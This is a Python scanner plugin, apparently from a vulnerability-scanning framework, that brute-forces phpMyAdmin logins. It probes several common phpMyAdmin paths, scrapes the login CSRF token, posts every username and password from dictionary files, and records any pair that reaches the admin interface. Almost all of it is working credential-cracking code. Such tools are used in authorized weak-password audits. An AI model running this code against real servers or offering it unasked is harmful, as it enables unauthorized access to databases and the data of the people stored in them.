#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author = 'orleven'

import re
import urllib.request
from base64 import b64encode
from script import Script, SERVER_PORT_MAP

class POC(Script):
    def __init__(self, target=None):
        self.server_type = SERVER_PORT_MAP.WEB
        self.name = 'phpmyadmin burst'
        self.keyword = ['phpmyadmin', 'burst', 'php']
        self.info = 'phpmyadmin burst'
        self.type = 'weakpass'
        self.level = 'high'
        self.refer = 'https://github.com/ysrc/xunfeng/blob/master/vulscan/vuldb/phpmyadmin_crackpass.py'
        Script.__init__(self, target=target, server_type=self.server_type)

    def prove(self):
        self.get_url()
        if self.base_url:
            flag_list = ['src="navigation.php', 'frameborder="0" id="frame_content"', 'id="li_server_type">','class="disableAjax" title=']
            usernamedic = self.read_file(self.parameter['U']) if 'U' in self.parameter.keys() else self.read_file('dict/phpmyadmin_usernames.txt')
            passworddic = self.read_file(self.parameter['P']) if 'P' in self.parameter.keys() else self.read_file('dict/phpmyadmin_passwords.txt')
            path_list = list(set([
                self.url_normpath(self.base_url, '/'),
                self.url_normpath(self.url, './phpmyadmin/'),
                self.url_normpath(self.base_url, '/phpmyadmin/'),
                self.url_normpath(self.url, './pmd/'),
                self.url_normpath(self.base_url, '/pmd/'),
                self.url_normpath(self.url, './'),
            ]))
            headers = {"Content-Type": "application/x-www-form-urlencoded"}
            for path in path_list:
                url = path + '/index.php'
                res = self.curl('get', url, headers=headers)
                if res and 'input_password' in res.text and 'name="token"' in res.text:
                    for linef1 in usernamedic:
                        username = linef1.strip('\r').strip('\n')
                        for linef2 in passworddic:
                            res1 = self.curl('get', url, headers=headers)
                            if res1 :
                                token = re.search('name="token" value="(.*?)" />', res1.text)
                                # token_hash = token.group(1)
                                token_hash = urllib.request.quote(token.group(1))
                                password = (
                                    linef2 if '%user%' not in linef2 else str(linef2).replace("%user%",
                                                                                              str(username))).strip(
                                    '\r').strip('\n')
                                postdata = "pma_username=%s&pma_password=%s&server=1&target=index.php&lang=zh_CN&collation_connection=utf8_general_ci&token=%s" % (
                                    username, password, token_hash)
                                res2 = self.curl('post', url, data=postdata, headers=headers)

                                if res2:
                                    for flag in flag_list:
                                        if flag in res2.text:
                                            self.flag = 1
                                            self.req.append({"username": username, "password": password})
                                            self.res.append({"info": url, "key": ":".join([username, password])})
                                            return
